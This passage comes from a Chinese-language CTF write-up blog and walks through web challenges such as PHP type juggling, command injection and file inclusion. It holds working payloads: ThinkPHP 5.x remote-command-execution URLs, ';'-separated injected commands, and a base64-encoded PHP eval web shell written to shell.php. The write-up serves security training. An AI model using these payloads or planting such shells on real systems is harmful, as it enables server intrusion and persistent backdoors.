class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -h<br>-I, <span class="hljs-comment">--head          Show document info only</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210923120039762.png" alt="curl -I 或者 --head" /></p></li></ol><h2 id="disabled_button"><a class="markdownIt-Anchor" href="#disabled_button"></a> disabled_button</h2><p>按钮被设置了<code>disabled</code>属性无法点击。在F12里删除后点击即可。</p><p><img src="https://upyun.wuuconix.link/image-20210923122923779.png" alt="ctf" /></p><h2 id="weak-auth"><a class="markdownIt-Anchor" href="#weak-auth"></a> weak auth</h2><p>Burp Cluster Bomb集束炸弹爆破。</p><p><img src="https://upyun.wuuconix.link/image-20210923124004357.png" alt="爆破" /></p><p>账号admin 密码123456</p><h2 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-variable">$a</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$a</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&gt;<span class="hljs-number">1234</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php弱类型绕过。</p><p>我们先看a。如果我们a传递一个<code>0</code>会怎么样呢？这里有一个常识需要记住，<code>$_GET</code>方式传递的值应该是没法传递整数的，也就是我们在浏览器地址栏的输入的数字实际上也是字符型串。</p><p><img src="https://upyun.wuuconix.link/image-20210923125212929.png" alt="$_GET string" /></p><p>如果我们a传值为<code>0</code>。比较 的时候也就是<code>&quot;0&quot; == 0</code>。在PHP中的<code>==</code>表示类型转化后是否相等。PHP中如果一个数字和一个数字字符串进行比较 ，那么就会自动按照数值进行比较，所以两者是相等的。但是我们无法获得flag，因为在php中<code>&quot;0&quot;</code>是等于的<code>FALSE</code>的。</p><p><img src="https://upyun.wuuconix.link/image-20210923125456354.png" alt="&quot;0&quot; == FALSE" /></p><p>所以我们传一个0，无法获得flag，这里可以用<code>&quot;0a&quot;</code>来绕过<code>&quot;0a&quot;</code>首先是一个字符串，但是它不是数字字符串，因为它不符合数字的规则，但是PHP在8.0版本之前，如果一个字符串和一个数字/<s>数字字符串</s>(php 5.6版本下失败) 进行比较时，会自动将字符串转化为数值。一个字符串如何转化为数值呢？其实就是根据它字符串中的最大数字字符串前缀来决定的。如下面的例子。</p><p><img src="https://upyun.wuuconix.link/image-20210923130340465.png" alt="字符与数字比较的例子 " /></p><p><code>123a</code>的最大数字字符串前缀为<code>123</code>。<code>a123</code>没有数字字符串的前缀，因为它第一个字符就是字母，所以它的等效数值为0。<code>1e2a</code>的前缀是科学计数法的<code>1e2</code>，所以它的等效数值为100。</p><p>了解了这些，我们很容易就想到一些payload来得到第一部分的flag。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">a</span>=<span class="hljs-keyword">a</span><br>?<span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>再看 第二部分，首先<code>b</code>不能为数字 ，但是它要大于<code>1234</code>。用<code>1235a</code>就可以了。因为字符串<code>1235a</code>在和1234比较的时候会自动转化为数值1235，比1234大，同时它还不是数字，实现绕过。</p><p>最终paylaod</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=a&amp;b=1235a<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210923130911663.png" alt="ctf" /></p><h2 id="postget"><a class="markdownIt-Anchor" href="#postget"></a> POST&amp;GET</h2><p><img src="https://upyun.wuuconix.link/image-20210924112225663.png" alt="题目" /></p><p>可以用Hackerbar来发请求。这里写个request脚本吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>data = &#123;<span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>&#125;<br>response = requests.post(<span class="hljs-string">&quot;http://111.200.241.244:54388/?a=1&quot;</span>, data=data).text<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924112326872.png" alt="ctf" /></p><h2 id="xff_referer"><a class="markdownIt-Anchor" href="#xff_referer"></a> xff_referer</h2><p>题目提示说ip地址必须是123.123.123.123，还必须来自https://www.google.com</p><blockquote><p><strong>X-Forwarded-For</strong>（<strong>XFF</strong>）是用来识别通过<a href="https://baike.baidu.com/item/HTTP">HTTP</a><a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86">代理</a>或<a href="https://baike.baidu.com/item/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载均衡</a>方式连接到<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">Web服务器</a>的客户端最原始的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>的HTTP请求头字段。</p></blockquote><blockquote><p><code>Referer</code>字段实际上告诉了服务器，用户在访问当前资源之前的位置。这往往可以用来用户跟踪。一个典型的应用是，有些网站不允许图片外链，只有自家的网站才能显示图片，外部网站加载图片就会报错。它的实现就是基于<code>Referer</code>字段，如果该字段的网址是自家网址，就放行。</p></blockquote><p>这道题里在请求包里加上两个属性即可。</p><p><img src="https://upyun.wuuconix.link/image-20210924113053647.png" alt="ctf" /></p><h2 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h2><p><img src="https://upyun.wuuconix.link/image-20210924113324797.png" alt="题目" /></p><p>蚁剑直连即可。</p><p><img src="https://upyun.wuuconix.link/image-20210924113229572.png" alt="蚁剑连接过程" /></p><p><img src="https://upyun.wuuconix.link/image-20210924113241200.png" alt="ctf" /></p><h2 id="command_execution"><a class="markdownIt-Anchor" href="#command_execution"></a> command_execution</h2><p>常见的命令执行题，利用命令分割符实现命令联合执行。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">; <span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924115112810.png" alt="/home/flag.txt" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">; cat <span class="hljs-regexp">/home/</span>flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924115228747.png" alt="ctf" /></p><h2 id="simple_js"><a class="markdownIt-Anchor" href="#simple_js"></a> simple_js</h2><p>开局让你输密码，但是无论你输什么，它都会弹出这句话。</p><p><img src="https://upyun.wuuconix.link/image-20210924123503030.png" alt="faux password haha" /></p><p>查看源代码，发现一个长相丑陋的js代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>)&#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab  = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>            <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<span class="hljs-keyword">var</span> i,j,k,l=<span class="hljs-number">0</span>,m,n,o,p = <span class="hljs-string">&quot;&quot;</span>;i = <span class="hljs-number">0</span>;j = tab.<span class="hljs-property">length</span>;<br>                    k = j + (l) + (n=<span class="hljs-number">0</span>);<br>                    n = tab2.<span class="hljs-property">length</span>;<br>                    <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>                            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>)<span class="hljs-keyword">break</span>;&#125;<br>                    <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>                    o = tab[i-l];<br>                            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k-<span class="hljs-number">1</span>)<br>                                    p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>                    &#125;<br>    p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>    pass = p;<span class="hljs-keyword">return</span> pass;<br>&#125;<br><span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br><span class="hljs-title function_">alert</span>( <span class="hljs-title function_">dechiffre</span>(h) );<br></code></pre></td></tr></table></figure><p>我们发现在此代码中有一些奇怪的数值，比如<code>70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65</code>和<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</code>。</p><p>观察第一个，怀疑是ascii码值。这里写一个简易脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i))<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924124406669.png" alt="result" /></p><p>这样我们就可以得知了，这个狗屁不同的js代码写了这么多，实际的功能就是把ascii码转化为字符，然后输出出来，不管我们输入的&quot;密码&quot;究竟是什么。</p><p>ok，那我么再分析第二个可以字符串，它是十六进制编码，我们可以用python直接print出来。</p><p><img src="https://upyun.wuuconix.link/image-20210924124814832.png" alt="十六进制" /></p><p>原来这里又藏了一些ascii码，只要再用上面的脚本跑一下就能出flag了。</p><p><img src="https://upyun.wuuconix.link/image-20210924125020221.png" alt="flag" /></p><p><img src="https://upyun.wuuconix.link/image-20210924125037336.png" alt="题目描述" /></p><p>配合上题目秒数里的flag格式，即可得到最终flag。</p><h2 id="baby_web"><a class="markdownIt-Anchor" href="#baby_web"></a> baby_web</h2><p>题目描述：想想初始页面是哪个</p><p><img src="https://upyun.wuuconix.link/image-20210924125552242.png" alt="1.php" /></p><p>打开来的页面是<code>1.php</code>。这十分奇怪，我们手动访问<code>index.php</code>也会自动跳转到<code>1.php</code>。</p><p>于是我们利用优雅的命令行<code>curl</code>来康康有什么玄机。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">111.200</span>.<span class="hljs-number">241.244</span>:<span class="hljs-number">57896</span>/index.php<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924125736958.png" alt="flag is hidden" /></p><p>能藏哪呢？只能响应包的标头里了吧2333</p><p><img src="https://upyun.wuuconix.link/image-20210924125818403.png" alt="curl -I" /></p><p>成功得到flag。同时我们也知道了跳转的原因了，是<code>Location</code>在起作用。</p><p>php如何添加头部信息呢？十分方便，用<code>header</code>函数即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="training-www-robots"><a class="markdownIt-Anchor" href="#training-www-robots"></a> Training-WWW-Robots</h2><p>简单的robots.txt藏信息，这不是和之前的<code>robots</code>题目重复了嘛2333。</p><p><img src="https://upyun.wuuconix.link/image-20210924130214511.png" alt="robots.txt" /></p><p><img src="https://upyun.wuuconix.link/image-20210924130222624.png" alt="ctf" /></p><h2 id="php_rce"><a class="markdownIt-Anchor" href="#php_rce"></a> php_rce</h2><p>ThinkPHP漏洞利用。</p><p>github有漏洞合集。<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合 (github.com)</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=index<span class="hljs-regexp">/\think\module/</span>action<span class="hljs-regexp">/param1/</span><span class="hljs-variable">$&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><p>随便找一个paylaod，试一下，得到准确版本。V5.0.20</p><p><img src="https://upyun.wuuconix.link/image-20210924131002896.png" alt="ThinkPHP V5.0.20" /></p><p>利用github里的5.0.21的命令执行漏洞即可。</p><p><img src="https://upyun.wuuconix.link/image-20210924131035489.png" alt="5.0.21" /></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">id</span></span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924131128290.png" alt="id" /></p><p>观察payload，发现运行的命令就是最后的<code>id</code>。只需要在这里改成其他的命令，我们就能命令执行了。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">ls</span> /</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924131235041.png" alt="ls /" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?s=index/\think\app/invokefunction&amp;<span class="hljs-keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924131311859.png" alt="ctf" /></p><p>得到flag后我还尝试了以下写木马2333。之前很多题都不能写，估计设置了权限。这道题可以。</p><p>首先把一句话木马base64加密一下，防止写文件时<code>$</code>被shell认为是特殊符号的问题（当然用单引号也可解决这个问题）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;wuuconix&quot;]);?&gt;&#x27;</span> | base64<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210924132005557.png" alt="base64" /></p><p>然后写文件。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">?s=<span class="hljs-built_in">index</span>/\think\app/invokefunction&amp;<span class="hljs-keyword">function</span>=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=<span class="hljs-built_in">system</span>&amp;vars[<span class="hljs-number">1</span>][]=<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWyJ3dXVjb25peCJdKTs/Pgo=&#x27;</span> | base64 -d &gt; <span class="hljs-keyword">shell</span>.php<br></code></pre></td></tr></table></figure><p>成功连接。</p><p><img src="https://upyun.wuuconix.link/image-20210924132157620.png" alt="get shell" /></p><p>我们可以看见Thinkphp的网站根目录是在<code>/var/www/public</code>里的。</p><h2 id="web_php_include"><a class="markdownIt-Anchor" href="#web_php_include"></a> Web_php_include</h2><p>这道题考察伪协议<code>php://input</code>的利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>include</code>函数的参数是一个文件名，也就是我们可以控制包含的一个文件名。但是显然，我们知道的文件只有<code>index.php</code>本身，自己包含自己没有意思，我们最好能够包含一个可以执行命令的php文件。</p><p><code>php://input</code>伪协议就可以帮助我们实现这个想法，它可以读取一个数据流。这个输入流是用POST方式传递的。</p><p>也就是这样一个过程。</p><ol><li>我们往page里写<code>php://input</code>，同时POST传递我们自己的php代码。</li><li>index.php include的时候发现，这不是普通的文件名，而是一个数据流，就把我们POST发送的php代码给包含了，这就实现了远程命令执行。</li></ol><p><code>php://input</code>生效的条件是<code>allow_url_fopen</code>和<code>allow_url_include</code>都设置为<code>On</code>。</p><p>题目其实还给了个phpinfo.php文件，这是后来命令执行的时候发现的，下次做题还是得先扫，掌握更多的信息。</p><p><img src="https://upyun.wuuconix.link/image-20210926132029194.png" alt="phpinfo" /></p><p>同时考虑到这道题对<code>php://</code>进行了循环检测，一直置空，普通的双拼是无法绕过的。但是它用的<code>strstr</code>函数和<code>stristr</code>，大小写敏感，所以我们用<code>Php://</code>大写绕过即可。</p><p><img src="https://upyun.wuuconix.link/image-20210926132339093.png" alt="rce" /></p><p>这道题最后<code>cat fl4gisisish3re.php</code>的时候，是看不到flag的，因为这个文件它内部是一个php的赋值语句，index.php include之后，没有echo 语句，照样看不到。有两种方法解决。</p><ol><li><p>cat 的时候加上base64加密。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># POST</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php | base64&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>利用php://filter 直接读base64加密后的源码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=Php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=fl4gisisish3r3.php<br></code></pre></td></tr></table></figure></li></ol><p>此外，其实这道题按理还有一种做法，那就是远程包含一个url文件。</p><p>但是这道题输入一个url后直接崩溃了，不知道什么情况。我在我服务器上尝试是可以的。</p><p><img src="https://upyun.wuuconix.link/image-20210926133041772.png" alt="url include" /></p><h2 id="ics-06"><a class="markdownIt-Anchor" href="#ics-06"></a> ics-06</h2><p>描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p><p>页面有个id。</p><p><img src="https://upyun.wuuconix.link/image-20210926160424518.png" alt="id" /></p><p>sql注入做多了，就以为是注入，但是手动试了很多都不行，没有回显，用sleep函数也失效。貌似输入除了非数字的都会跳转到<code>id=1</code>。因为它的标头里有个<code>Localtion</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210926160630863.png" alt="Location" /></p><p>自然sqlmap也扫不出来。</p><p>无奈看wp，看到一半突然知道直接爆破id即可。</p><p>当id为2333时，即可获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20210926160752587.png" alt="ctf" /></p><h2 id="warmup"><a class="markdownIt-Anchor" href="#warmup"></a> warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题之前刚接触ctf的时候做过，当时很难理解。现在很好理解了。</p><p>首先这道题有个<code>hint.php</code>，提示flag在<code>ffffllllaaaagggg</code></p><p><img src="https://upyun.wuuconix.link/image-20210926162915376.png" alt="hint" /></p><p>而<code>souce.php</code>中有<code>include</code>文件包含函数，我们可以想办法绕过，然后去包含这个flag文件即可。</p><p>题目中有这样一个语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ 